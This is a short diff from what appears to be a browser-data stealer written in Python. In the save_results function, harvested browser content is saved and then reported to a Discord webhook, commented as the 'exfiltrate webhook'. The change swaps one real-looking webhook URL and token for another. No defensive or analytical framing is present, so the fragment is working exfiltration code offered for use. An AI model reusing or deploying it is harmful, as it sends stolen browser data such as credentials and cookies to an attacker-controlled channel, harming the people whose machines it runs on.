@@ -124,7 +124,7 @@ def save_results(browser_name, type_of_data, content):
         with open(file_path, "w", encoding="utf-8") as temp_file:
             temp_file.write(content)
         
-        Webhookurl = "https://discord.com/api/webhooks/1364397291154178218/3lld-7FmNFz1pLoKANENDcX650Mf562EOSS4H9sPAYHXD2qJqGbGe9IfpRS9Z4Vc2td9"  #exfiltrate webhook here
+        Webhookurl = "https://discord.com/api/webhooks/1365067496620687431/EMhaPQ9qtsXd306vKkYq0Pie7OxxDODgQPOX2_mt9wJfqrt_tK1FlKtFAgLv1dVhp7IO"  #exfiltrate webhook here
         webhook = DiscordWebhook(
             url=Webhookurl,
             content=f"Extracted {type_of_data.replace('_', ' ')} from {browser_name}."
